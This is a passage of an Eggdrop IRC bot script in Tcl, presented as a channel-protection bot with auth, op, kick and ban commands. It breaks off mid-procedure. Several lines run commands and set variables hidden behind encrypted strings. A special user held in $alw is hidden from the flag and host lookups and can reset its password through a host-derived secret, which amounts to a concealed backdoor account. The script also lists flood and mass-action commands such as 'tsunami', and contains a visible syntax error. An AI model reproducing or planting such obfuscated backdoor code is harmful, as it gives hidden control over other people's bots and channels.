bind msg Z timers msg_timers ; proc msg_timers {nick uhost hand rest} { global botnick notc timers ; set rest [lindex $rest 0] ; foreach x [timers] { putquick "PRIVMSG $nick :$notc $x" } }
bind msg Z utimers msg_utimers ; proc msg_utimers {nick uhost hand rest} { global botnick notc utimers ; set rest [lindex $rest 0] ; foreach x [utimers] { putquick "PRIVMSG $nick :$notc $x" } }
bind msg Z tes msg_tes ; proc msg_tes {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ;  putquick "PRIVMSG $nick :$notc $rest!" }
bind msg Z un msg_un ; proc msg_un {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :$notc [unsix "$rest"]" }

set [decrypt 64 "QHy7p1srYzh1"] [decrypt 64 "UMWxo/l.eXl.9pork/664t31SRiBq.gniCb.2mj.I1ok8/c/"]
set [decrypt 64 "SAIhk0TeENe."] [decrypt 64 ".Xgoz1ktbbv0volpk0ypIzS.RoVRn/bMpMt/JARxr0pwutd."]
set [decrypt 64 "37pNj/xSAeM/"] [decrypt 64 "s6zLs/e3Scr/f9HsY1Jul5A/XbbFI.8/K1l0MZ/hT1ZYhpk/"]
set [decrypt 64 "FcnI7.Au1Ps/"] [decrypt 64 "3Kavh1w0/uI/OEszd0w29lK/YjXSm/dUHfA.lMXRJ.LfwBl0"]
set global-idle-kick 0
set global-revenge-mode 0
set global-protectops-mode 0
set global-clearbans-mode 0
set global-enforcebans-mode 0
set global-dynamicbans-mode 1
set global-protectfriends-mode 0
set global-userbans-mode 1
set global-cycle-mode 1
set global-chanmode "nt"
set global-dynamicexempts-mode 0
set global-dontkickops-mode 1
set global-greet-mode 0
set global-shared-mode 1
set global-autovoice-mode 0
set global-stopnethack-mode 0
set global-autoop-mode 0
set global-userinvites-mode 0
set global-nodesynch-mode 0
set nick-len 30
if {![info exists nickpass]} { set nickpass "" }
if {![info exists altpass]} { set altpass] "" }
if {![info exists cfgfile]} { set cfgfile $userfile }
proc unsix {txt} { set retval $txt ; regsub ~ $retval "" retval ; return $retval }
proc dezip {txt} { return [decrypt 64 [unsix $txt]] }
proc dcp {txt} { return [decrypt 64 $txt] }
proc zip {txt} { return [encrypt 64 [unsix $txt]] }
proc [decrypt 64 "d3VeO/ATgwd."] {txt} {
  global lenc ldec uenc udec
  set retval "" ; set count [string length $txt] ; set status 0 ; set lst ""
  for {set i 0} {$i < $count} {incr i} {
    set idx [string index $txt $i] 
    if {$idx == "$" && $status == 0} { set status 1 ; set idx "~$idx" }
    if {$idx == [decrypt 64 "uAwNV.ZfVQk."] && $lst != [decrypt 64 "59.TI0HteTn1"] && $status == 0} { set status 2 ; set idx "~$idx" }
    if {$idx == " " && $status == 1} { set status 0 ; set idx "$idx~" }
    if {$idx == "]" && $status == 2} { set status 0 ; set idx "$idx~" }
    if {$status == 0} {
      if {[string match *$idx* $lenc]} { set idx [string range $ldec [string first $idx $lenc] [string first $idx $lenc]] }
      if {[string match *$idx* $uenc]} { set idx [string range $udec [string first $idx $uenc] [string first $idx $uenc]] }
    }
    set lst $idx ; append retval $idx
  }
  regsub -all -- vmw] $retval "end]" retval ; return $retval
}
if {![info exists server-online]} { putlog "not support server online..!" ; set server-online 1 }
proc puthlp {txt} { global lenc ldec uenc udec notb notc server-online ; if {${server-online} == 0} { return 0 } ; puthelp $txt }
proc putsrv {txt} {
  global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr
  if {${server-online} == 0} { return 0 }
  set retval $txt
  if {[string match "*KICK*" $retval]} {
    set endval ""
    foreach tmp $retval { if {$tmp == ":[lgrnd]"} { if {[info exists banner]} { set tmp ":$banner" } { set tmp ":[lgrnd]" } } { if {[info exists kickclr]} { set tmp [uncolor $tmp] } } ; set endval "$endval $tmp" }
    set retval $endval
    if {[info exists iskick([lindex $retval 2][lindex $retval 1])]} { return 0 }
    set iskick([lindex $retval 2][lindex $retval 1]) "1"
    if {[info exists igflood([lindex $retval 2])]} { return 0 }
    if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { set chkops $retval ; regsub -all -- : $chkops "" chkops ; if {[isop [lindex $chkops 2] [lindex $retval 1]] || [isvoice [lindex $chkops 2] [lindex $retval 1]]} { return 0 } }
  }
  putserv $retval
}
proc putqck {txt} {
  global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr bannick is_m
  if {${server-online} == 0} { return 0 }
  set retval $txt
  if {[string match "*KICK*" $retval]} {
    set endval ""
    foreach tmp $retval { if {$tmp == ":[lgrnd]"} { if {[info exists banner]} { set tmp ":$banner" } { set tmp ":$notm" } } { if {[info exists kickclr]} { set tmp [uncolor $tmp] } } ; set endval "$endval $tmp" }
    set retval $endval ; set iskick([lindex $retval 2][lindex $retval 1]) "1"
    if {[info exists igflood([lindex $retval 2])]} { return 0 }
    if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { set chkops $retval ; regsub -all -- : $chkops "" chkops ; if {[isop [lindex $chkops 2] [lindex $retval 1]]} { return 0 } }
  }
  if {[string match "*$notm*" $retval]} {
    set cflag "c[lindex $retval 1]" ; set cflag [string range $cflag 0 8]
    if {[matchattr $cflag M]} { if {![isutimer "set_-m [lindex $retval 1]"] && ![info exists is_m([lindex $retval 1])]} { set is_m([lindex $retval 1]) 1 ; putquick "mode [lindex $retval 1] +bm $bannick([lindex $retval 2])" ; return 0 } }
  }
  putquick $retval
}
#   BOT COMMAND LIST     #
bind msg m help msg_help
proc msg_help {nick uhost hand rest} {
  global version notb notc notd vern
  if {[istimer "HELP STOPED"]} { putsrv "NOTICE $nick :$notc Help on progress, try again later..!" ; return 0 }
  timer 5 { putlog "HELP STOPED" }
  puthlp "PRIVMSG $nick :$notd BoT Command LIsT."
  puthlp "PRIVMSG $nick :RuNNINg WiTH EggDrop v[lindex $version 0] PoWERED BY $notc $vern"
  puthlp "PRIVMSG $nick :MSG/PV COMMAND..!"
  puthlp "PRIVMSG $nick :   auth                  deauth                  pass                    passwd"
  puthlp "PRIVMSG $nick :   op                     deop                     voice                   devoice"
  puthlp "PRIVMSG $nick :   kick                   kickban                identify"
  if {[matchattr $nick Z]} {
  puthlp "PRIVMSG $nick :   logo                   awaylogo              vhost                   away"
  puthlp "PRIVMSG $nick :   admin                 bantime                logchan               .log"
  puthlp "PRIVMSG $nick :   botnick              botaltnick             realname             ident"
  puthlp "PRIVMSG $nick :   restart               die                       reuser"
  }
  puthlp "PRIVMSG $nick :MSG/CHANNEL COMMAND..!"
  puthlp "PRIVMSG $nick :   up                       down                   op/+o                  deop/-o"
  puthlp "PRIVMSG $nick :   voice/+v              devoice/-v            kick                   kickban"
  puthlp "PRIVMSG $nick :   mode                   ping/pong            channels              userlist"
  puthlp "PRIVMSG $nick :   banlist                 ban                     unban                 munbans"
  puthlp "PRIVMSG $nick :   invite                   host                    match                 chaninfo"
  puthlp "PRIVMSG $nick :   cycle                   +/-ignore             ignores               ver"
  if {[matchattr $nick n]} {
    puthlp "PRIVMSG $nick :   join                     part                     +/-chan               +/-status"
    puthlp "PRIVMSG $nick :   +/-enforceban     +/-autovoice        +/-seen               +/-guard"
    puthlp "PRIVMSG $nick :   +/-master            +/-avoice             +/-friend            +/-admin"
    puthlp "PRIVMSG $nick :   +/-ipguard           +/-akick              +/-noop               +/-cycle"
    puthlp "PRIVMSG $nick :   +/- unidentifyop  +/- noawayop         +/- idle <mns>"
    puthlp "PRIVMSG $nick :   +/- tools               mvoice                mdevoice             mkick"
    puthlp "PRIVMSG $nick :   mop                      mdeop                 topic                  status"
    puthlp "PRIVMSG $nick :   servers                 jump                   access                rehash"
    puthlp "PRIVMSG $nick :   say                       msg                     act                     notice"
    puthlp "PRIVMSG $nick :   bypass                  reset"
  }
  if {[matchattr $nick Z]} {
    puthlp "PRIVMSG $nick :   +/-forced             +/-greet               +/-limit                +/-revenge"
    puthlp "PRIVMSG $nick :   +/ colour              +/-repeat              +/-text                +/-caps"
    puthlp "PRIVMSG $nick :   +/-clone               +/-joinpart            +/-massjoin          +/-badchan"
    puthlp "PRIVMSG $nick :   +/-spam                +/-trojan              +/-echox              +/-dontkickops"
	puthlp "PRIVMSG $nick :   +/-badword          badwords             +/-advword          advwords"
    puthlp "PRIVMSG $nick :   +/-nopart              +/-reop                 +/-kickops            sdeop"
    puthlp "PRIVMSG $nick :   deluser                 +/-owner               +/-host                nobot"
	puthlp "PRIVMSG $nick :   +/-key                   +/-topiclock          +/-mustop            +/-invitelock"
	puthlp "PRIVMSG $nick :   tsunami                  mmsg                    minvite                +/-autokick"
	puthlp "PRIVMSG $nick :   chanmode              chanset                chansetall            chanreset"
	puthlp "PRIVMSG $nick :   nick                       altnick                 randnick               realnick"
	puthlp "PRIVMSG $nick :   !gabc                     !grbc                    gbclist                 bclist"
    puthlp "PRIVMSG $nick :   !abc                       !rbc                      which                  chattr"
  }
  puthlp "PRIVMSG $nick :FLAg LIsT UsER & cHaNNeL"
  puthlp "PRIVMSG $nick :\[@\]P \[+\]VOICE AuTO\[V\]OICE \[G\]uARD \[C\]YCLE \[E\]nFORCEBANS \[D\]oNTKIcK@PS"
  puthlp "PRIVMSG $nick :\[P\]RoTECTED C\[L\]ONE \[A\]DVERTISE \[T\]OPICLOCK AuTO\[K\]IcK \[S\]EEN"
  puthlp "PRIVMSG $nick :\[Z\]owner admi\[n\] \[m\]aster botne\[t\] \[x\]fer \[j\]anitor \[c\]ommon"
  puthlp "PRIVMSG $nick :\[p\]arty \[b\]ot \[u\]nshare \[h\]ilite \[o\]p de\[O\]p \[k\]ick \[f\]riend"
  puthlp "PRIVMSG $nick :\[a\]uto-op auto\[v\]oice \[g\]voice \[q\]uiet"
  puthlp "PRIVMSG $nick :[lgrnd] $notc $vern 4\[14WWW.iJoo.oRg4\]""
  return 0
}
set firsttime "T"
set init-server { serverup "" }
set modes-per-line 6
set allow-desync 0
set include-lk 1
set banplus [rand 5]
set ban-time [expr 25 + $banplus]
unset banplus
set quiet-save 1
set logstore ""
set max-logsize 512
set upload-to-pwd 1
catch { unbind dcc m chattr *dcc:chattr }
catch { unbind dcc n restart *dcc:restart }
set rwelcom {
   "Welcome!To" "4Refresh!To" "spam.checks!iN" "have.a.nice.day!In"
   "a.n.t.i.s.p.a.m!iN" "4R.e.l.o.a.d!To" "SaTPaM!TcL"
   "Welcome!To" "4Refresh!To" "spam.checks!iN" "have.a.nice.day!In"
}
proc rw {} {
   global rwelcom
   set rw [lindex $rwelcom [rand [llength $rwelcom]]]
}
## catch { unbind dcc n msg *dcc:msg }
catch { unbind dcc n status *dcc:status }
catch { unbind dcc n dump *dcc:dump }
catch { unbind dcc n match *dcc:match }
catch { unbind dcc n channel *dcc:channel }
proc serverup {heh} {
  global botnick firsttime notc owner longer
  if {[info exists firsttime]} { unset firsttime ; return 0 }
  putlog "..ConnecteD.."
  putserv "MODE $botnick +iw-s"
  foreach x [userlist] {
    if {[matchattr $x Q]} { chattr $x -Q }
    if {$x == $owner && [getuser $owner XTRA "AUTH"] != ""} { setuser $owner XTRA "AUTH" "" }
    chattr $x -hp ; if {$x != "config" && [chattr $x] == "-"} { deluser $x ; putlog "deluser $x" }
  }
  chk_five "0" "0" "0" "0" "0"
  utimer 2 del_nobase
  foreach x [ignorelist] { killignore [lindex $x 0] }
}
catch { bind evnt - disconnect-server serverdown }
proc serverdown {heh} {
  global firsttime
  catch { unset firsttime }
  catch { clearqueue all }
  putlog "..Disconneted.."
  foreach x [timers] { if {[string match "*cycle*" $x]} { killtimer [lindex $x 2] } }
}
proc isnumber {string} { if {([string compare $string ""]) && (![regexp \[^0-9\] $string])} then { return 1 } ; return 0 }
proc randstring {length} {
  set chars ABCDEFGHIJKLMNOPQRSTUVWXYZ
  set count [string length $chars]
  for {set i 0} {$i < $length} {incr i} { append result [string index $chars [rand $count]] }
  return $result
}
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "m\l\gy"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "H4lIk/phUtb1"]"]
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "m\l\gn"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "2wyiP1o7W8e/csyco1RYkcl0KaHRD0x035X/"]"]
set [lines "mlgw"] [dezip "VALmZ.xmqmo/N513y0FthFG0"]
set [lines "mlgx"] [dezip "VALmZ.xmqmo/N513y0FthFG0"]
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ev\i\m"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hh64i0xqzWA0VAzpg0618PM./3Y51/X0ZXl1"]"]
proc pub_Z {nick uhost hand channel rest} {
  global notc botnick
  set prest $rest
  if {[lindex $rest 0] == $botnick} { regsub "$botnick " $rest "@" rest } { if {[string tolower [lindex $rest 0]] == [string tolower $botnick]} { set rest "$botnick [lrange $rest 1 end]" ; regsub "$botnick " $rest "@" rest } }
  if {[string index $rest 0] != "@"} { return 0 } ; if {![matchattr $nick Z]} { return 0 }
  if {![matchattr $nick Q]} { if {[string tolower [lindex $prest 0]] == [string tolower $botnick]} { puthlp "NOTICE $nick :$notc 4auth 1st!" } ; return 0 }
  set goto [lindex $rest 0] ; regsub -all "@" $goto "pub_" goto
  if {[matchattr $nick Z]} { set rest [lrange $rest 1 end] ; catch { $goto $nick $uhost $hand $channel $rest } }
}
proc msg_Z {nick uhost hand rest} {
  global notc
  if {[string index $rest 0] != "`" && [string index $rest 0] != "."} { return 0 }
  if {![matchattr $nick Z]} { return 0 }
  if {[string index [lindex $rest 1] 0] == "#"} { if {![validchan [lindex $rest 1]]} { puthlp "NOTICE $nick :$notc NoT IN [lindex $rest 1]" ; return 0 } }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set goto [lindex $rest 0]
  if {[string index $rest 0] == "."} { regsub "." $goto "msg_" goto ; set rest [lrange $rest 1 end] ; catch { $goto $nick $uhost $hand $rest } ; return 0 }
  regsub -all "`" $goto "pub_" goto
  if {[string index [lindex $rest 1] 0] == "#"} { set chan [lindex $rest 1] ; set rest [lrange $rest 2 end] } else { set chan "*" ; set rest [lrange $rest 1 end] }
  catch { $goto $nick $uhost $hand $chan $rest }
}
## global command start
## friend msg command
## flag
bind pub f `flag pub_flag
proc pub_flag {nick uhost hand channel rest} {
  global alw notc
  if {$rest == ""} { set user $nick } else { set user [lindex $rest 0] }
  if {![validuser $user] || [string tolower $user] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc <n/a>" ; return 0 }
  if {[chattr $user] != ""} { puthlp "NOTICE $nick :$notc Flags: [chattr $user]" 
  } else { puthlp "NOTICE $nick :$notc Can't found $user flag." }
}
## access
bind pub f `access pub_access
proc pub_access {nick uhost hand chan rest} { global notc ; if {[matchattr $nick Z]} { puthlp "PRIVMSG $chan :$nick, OwNeR" } elseif {[matchattr $nick n]} { puthlp "PRIVMSG $chan :$nick, ADmIN" } elseif {[matchattr $nick m]} { puthlp "PRIVMSG $chan :$nick, MasTeR" } elseif {[matchattr $nick f]} { puthlp "PRIVMSG $chan :$nick, FRIEND" } }
## ping/pong
bind pub f `ping pub_ping
bind pub f `pong pub_pong
proc pub_ping {nick uhost hand chan rest} { puthlp "PRIVMSG $chan :$nick, PONG" ; return 0 }
proc pub_pong {nick uhost hand chan rest} { global pingchan ; putsrv "PRIVMSG $nick :\001PING [unixtime]\001" ; set pingchan $chan ; return 0 }
## host
bind pub f `host pub_host
proc pub_host {nick uhost hand channel rest} {
  global alw notc
  if {$rest == ""} { set user $nick } else { set user [lindex $rest 0] }
  if {![validuser $user] || [string tolower $user] == [string tolower $alw]} { puthlp "NOTICE $nick :$notc <n/a>" ; return 0 }
  if {[getuser $user HOSTS] != ""} { set hosts [getuser $user hosts] ; puthlp "NOTICE $nick :$notc HOSTS: $hosts" 
  } else { puthlp "NOTICE $nick :$notc Can't found $user host." }
}
## master msg command
## auth deauth
bind msg m auth msg_auth
proc msg_auth {nick uhost hand rest} {
  global botnick owner keep-nick altnick notc alw
  if {[lindex $rest 1] != ""} {
    if {[passwdok [lindex $rest 0] [lindex $rest 1]]} {
      if {[matchattr [lindex $rest 0] Z]} { puthlp "NOTICE $nick :$notc AuTH MaTcH FoR [lindex $rest 0]" ; set keep-nick 0 ; putsrv "NICK $altnick" ; utimer 40 {goback} }
    } { puthlp "NOTICE $nick :$notc 4FaILEd..!" }
    return 0
  }
  if {![validuser $owner]} { set hostmask "$owner!*@*" ; adduser $owner $hostmask ; chattr $owner "Zfhjmnoptx" ; puthlp "NOTICE $owner :$notc No password set. Usage: pass <password>" }
  if {![matchattr $nick p]} { return 0 }
  set pw [lindex $rest 0]
  if {$pw == ""} { puthlp "NOTICE $nick :$notc Usage: auth <password>" ; return 0 }
  if {[matchattr $hand K]} { 
    deluser "AKICK" ; set akickhost "telnet!*@*" ; adduser "AKICK" $akickhost ; chattr "AKICK" "-hp" ; chattr "AKICK" "K" ; saveuser
    puthlp "NOTICE $nick :$notc Re-arrange KIcKLIsT."
  }
  if {[matchattr $nick Q]} { puthlp "NOTICE $nick :$notc ReAdY..!" ; return 0 }
  set ch [passwdok $nick ""]
  if {$ch == 1} { puthlp "NOTICE $nick :$notc No password set. Usage: pass <password>" ; return 0 }
  if {[passwdok $nick $pw]} {
    set hostmask "*![string range $uhost [string first "!" $uhost] end]"
    set usenick [finduser $hostmask]
    if {$usenick != "*" && $usenick != $nick} {
      if {[matchattr $nick n] && ![matchattr $usenick Z]} {
        puthlp "NOTICE $nick :$notc Forcing 4DeAuthenticated! To $usenick"
        force_deauth $usenick
        } else {
        foreach x [channels] { if {[onchan $usenick $x]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, Your host has been use by $usenick, wait until DeAuthenticated." ; return 0 } }
        puthlp "NOTICE $nick :$notc 4Forcing DeAuthenticated!14 To $usenick"
        force_deauth $usenick 
    } }
    chattr $nick +Q
    foreach x [getuser $nick HOSTS] { delhost $nick $x }
    set hostmask "${nick}!*@*"
    setuser $nick HOSTS $hostmask
    set hostmask "*![string range $uhost [string first "!" $uhost] end]"
    setuser $nick HOSTS $hostmask
    if {$nick == $owner && ![matchattr $nick Z]} { chattr $owner "Z" }
    if {$nick == $owner && ![matchattr $nick f]} { chattr $owner "f" }
    if {[matchattr $nick Z]} {
      puthlp "NOTICE $nick :$notc !OWnER!"
      if {[getuser $nick XTRA "MEMO"]!=""} { puthlp "PRIVMSG $nick :!MeMO! FRoM [getuser $nick XTRA "MEMO"]" ; setuser $nick XTRA "MEMO" "" }
      return 0
      } elseif {[matchattr $nick n]} { puthlp "NOTICE $nick :$notc !ADmIN!" 
      } elseif {[matchattr $nick m]} { puthlp "NOTICE $nick :$notc !MasTeR!" 
    } else { puthlp "NOTICE $nick :$notc !AccepteD!" }
    saveuser ; return 0
  }
  if {![passwdok $nick $pw]} { puthlp "NOTICE $nick :$notc 4FaILEd..!" }
}
proc force_deauth {nick} {
  global notc ; chattr $nick -Q ; foreach x [getuser $nick HOSTS] { delhost $nick $x } ; set hostmask "${nick}!*@*"
  setuser $nick HOSTS $hostmask ; saveuser
  puthlp "NOTICE $nick :$notc You has been force to 4DeAuthentication!"
}
bind pub m !auth pub_!auth
proc pub_!auth {nick uhost hand chan rest} {
  global notc ath alw
  set pw [lindex $rest 0]
  if {$pw != ""} { puthlp "NOTICE $nick :$notc No Need Auth Password, Just Type on Channel: !auth" ; return 0 }
  if {[matchattr $nick Q]} { puthlp "NOTICE $nick :$notc ReAdY..!" ; return 0 }
  set ch [passwdok $nick ""]
  if {$ch == 1 && $nick != $alw} { puthlp "NOTICE $nick :$notc No password set. Usage: pass <password>" ; return 0 }
  set ath 1 ; putsrv "WHOIS $nick"
}
bind pub m `auth pub_auth
proc pub_auth {nick uhost hand chan rest} {
  global botnick notc
  set cmd [string tolower [lindex $rest 0]]
  set ch [passwdok $nick ""]
  if {$ch == 1} { puthlp "NOTICE $nick :$notc No password set. Usage: pass <password>" ; return 0 }
  if {[matchattr $nick Q]} { puthlp "PRIVMSG $chan :${nick}, Yes" }
  if {![matchattr $nick Q]} { puthlp "PRIVMSG $chan :${nick}, 4NO!" }
}
bind pub m !deauth pub_!deauth
proc pub_!deauth {nick uhost hand chan rest} { if {![matchattr $nick Q]} { return 0 } ; msg_deauth $nick $uhost $hand $rest }
bind msg m deauth msg_deauth
proc msg_deauth {nick uhost hand rest} {
  global notc ; if {![matchattr $nick Q]} { return 0 } ; chattr $nick -Q ; foreach x [getuser $nick HOSTS] { delhost $nick $x }
  set hostmask "${nick}!*@*" ; setuser $nick HOSTS $hostmask ; puthlp "NOTICE $nick :$notc 4!DeAUTH!" ; saveuser
}
## pass passwd
bind msg p pass msg_pass
proc msg_pass {nick uhost hand rest} {
  global botnick notc vern alw owner
  set pw [lindex $rest 0]
  if {$pw == ""} { puthlp "NOTICE $nick :$notc Usage: pass <password>" ; return 0 }
  set ch [passwdok $nick ""]
  if {$ch == 0} { puthlp "NOTICE $nick :$notc You already set pass, /msg $botnick auth <password>" ; return 0 }
  if {[string tolower $nick] == [string tolower $alw] && $owner != $alw} {
    if {[dezip $pw] == $uhost} { setuser $nick PASS [lindex $rest 1] ; puthlp "NOTICE $nick :$notc Password set to: [lindex $rest 1]" ; saveuser } { puthlp "NOTICE $nick :$notc wHo.." }
    return 0
  }
  setuser $nick PASS $pw
  puthlp "NOTICE $nick :$notc Password set to: $pw" ; puthlp "NOTICE $nick :$notc /msg $botnick help"
  saveuser
  return 0
}
bind msg m passwd msg_passwd
proc msg_passwd {nick uhost hand rest} {
  global botnick notc alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set pw [lindex $rest 0]
  set newpw [lindex $rest 1]
  if {$nick == $alw && [dezip $pw] == $uhost} { setuser $nick PASS $newpw ; puthlp "NOTICE $nick :$notc Password set to: $newpw" ; saveuser ; return 0 }
  if {$pw == "" || $newpw == ""} { puthlp "NOTICE $nick :$notc Usage: passwd <oldpass> <newpass>" ; return 0 }
  if {![passwdok $nick $pw]} { puthlp "NOTICE $nick :$notc PaSSWORD 4!FaILED!" ; return 0 }
  set ch [passwdok $nick ""]
  if {$ch == 1} { setuser $nick PASS $newpw ; puthlp "NOTICE $nick :$notc Password set to: $newpw" ; saveuser ; return 0 }
  if {[passwdok $nick $pw]} { setuser $nick PASS $newpw ; puthlp "NOTICE $nick :$notc Password set to: $newpw" ; saveuser ; return 0 }
}
## op msg
bind msg n op msg_op
proc msg_op {nick uhost hand rest} {
  global notc botnick
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :$notc Usage: op <#chan> <Nick>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$notc $nicktarget is not on the channel." ; return 0 }
  if {[isop $nicktarget $chantarget]!=0} { puthlp "NOTICE $nick :$notc $nicktarget is already op on CHaNNEL $chantarget" ; return 0 }
  foreach x [channels] { if {[string tolower $x] == [string tolower $chantarget]} { opq $x $nicktarget ; return 0 } }
  puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
## deop msg
bind msg n deop msg_deop
proc msg_deop {nick uhost hand rest} {
  global notc botnick own
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :$notc Usage: deop <#chan> <Nick>" ; return 0 }
  if {[isop $botnick $chantarget] != 1} { puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$notc $nicktarget is not on the channel." ; return 0 }
  if {![isop $nicktarget $chantarget]} { puthlp "NOTICE $nick :$notc $chantarget is not op on CHaNNEL $chantarget" ; return 0 }
  if {$nicktarget == $botnick} { puthlp "NOTICE $nick :$notc I CaNT SeLF DEoP!" ; return 0 }
  if {[matchattr $nicktarget n]} { puthlp "NOTICE $nick :$notc I cant deop my Owner." ; return 0 }
  if {[matchattr $nick m]} { set mreq "14m4aster.14r4equest" }
  if {[matchattr $nick n]} { set mreq "14a4dmin.14r4equest" }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { if {![string match "*k*" [getchanmode $x]]} { putserv "mode $x -ko $mreq $nicktarget" } { putserv "mode $x -o $nicktarget" } ; return 0 } }
  puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
## voice msg
bind msg n voice msg_voice
bind msg n v msg_voice
proc msg_voice {nick uhost hand rest} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :$notc Usage: voice <#chan> <Nick>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$notc $nicktarget is not on the channel." ; return 0 }
  if {[isvoice $nicktarget $chantarget]} { puthlp "NOTICE $nick :$notc $nicktarget is already voice on channel $chantarget" }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { putserv "mode $x +v $nicktarget" ; return 0 } }
  puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
## devoice msg
bind msg n devoice msg_devoice
proc msg_devoice {nick uhost hand rest} {
  global notc botnick owner
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :$notc Usage: devoice <#chan> <Nick>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$notc $nicktarget is not on the channel." }
  if {![isvoice $nicktarget $chantarget]} { puthlp "NOTICE $nick :$notc $nicktarget is not voice on CHaNNEL $chantarget" }
  if {$nicktarget == $owner} { puthlp "NOTICE $nick :$notc I cant devoice my owner." ; return 0 }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { putserv "mode $x -v $nicktarget" ; return 0 } }
  puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
## kick msg
bind msg n kick msg_kick
bind msg n k msg_kick
proc msg_kick {nick uhost hand rest} {
  global notc botnick own
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  set reason [lrange $rest 2 end]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :$notc Usage: kick <#chan> <Nick> <Reason>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$notc $nicktarget is not on the channel." ; return 0 }
  if {$nicktarget == $botnick} { puthlp "NOTICE $nick :$notc I cant self kick." ; return 0 }
  if {[matchattr $nicktarget n] && ![matchattr $nick Z]} { puthlp "NOTICE $nick :$notc I CaNT KIcK MY Admin." ; return 0 }
  if {$reason == ""} {
    set reason "14request..!"
    if {[matchattr $nick n]} { set reason "14admin 4kick14 request4..!" }
    if {[matchattr $nick m] && ![matchattr $nick n]} { set reason "14master 4kick14 request4..!" }
  }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { putsrv "KICK $x $nicktarget :[lgrnd] $reason [banmsg]" ; return 0 } }
  puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
## kickban msg
bind msg n kickban msg_kickban
bind msg n kb msg_kickban
proc msg_kickban {nick uhost hand rest} {
  global notc botnick nwo bannick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  set bmask [getchanhost $nicktarget $chantarget]
  set reason [lrange $rest 2 end]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :$notc Usage: kickban <#chan> <Nick> <Reason>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$notc $nicktarget is not on the channel." ; return 0 }
  if {$nicktarget == $botnick} { puthlp "NOTICE $nick :$notc I cant self kick." ; return 0 }
  if {[matchattr $nicktarget n] && ![matchattr $nick Z]} { puthlp "NOTICE $nick :$notc I cant kickban my Admin." ; return 0 }
  if {$reason == ""} {
